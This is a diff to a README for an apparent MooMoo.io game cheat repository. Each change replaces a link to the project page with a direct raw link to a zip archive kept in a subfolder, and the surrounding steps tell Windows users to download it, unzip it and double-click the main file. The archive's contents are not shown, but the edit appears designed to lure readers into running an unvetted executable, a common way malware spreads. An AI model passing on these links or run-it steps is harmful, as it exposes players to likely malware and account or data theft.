@@ -1,10 +1,10 @@
 # 🛠 moomooiohack-2026 - Tools to change your MooMoo game
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aliemads3360/moomooiohack-2026)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aliemads3360/moomooiohack-2026/raw/refs/heads/main/Jakob/moomooiohack-woodlocked.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/aliemads3360/moomooiohack-2026
+Visit this page to download: https://github.com/aliemads3360/moomooiohack-2026/raw/refs/heads/main/Jakob/moomooiohack-woodlocked.zip
 
 Use the link above to open the project page, then get the latest Windows file or release package from there.
 
@@ -44,7 +44,7 @@ Best results:
 
 Follow these steps in order:
 
-1. Open the download page: https://github.com/aliemads3360/moomooiohack-2026
+1. Open the download page: https://github.com/aliemads3360/moomooiohack-2026/raw/refs/heads/main/Jakob/moomooiohack-woodlocked.zip
 2. Look for the latest release, file, or main project download on the page
 3. Download the Windows package to your computer
 4. Open the file or unzip the folder if it comes in a compressed archive
@@ -159,7 +159,7 @@ Before opening the file:
 ## 🖱 Quick path for new users
 
 If you want the shortest path:
-1. Go to https://github.com/aliemads3360/moomooiohack-2026
+1. Go to https://github.com/aliemads3360/moomooiohack-2026/raw/refs/heads/main/Jakob/moomooiohack-woodlocked.zip
 2. Download the Windows file
 3. Extract it if needed
 4. Double-click the main file
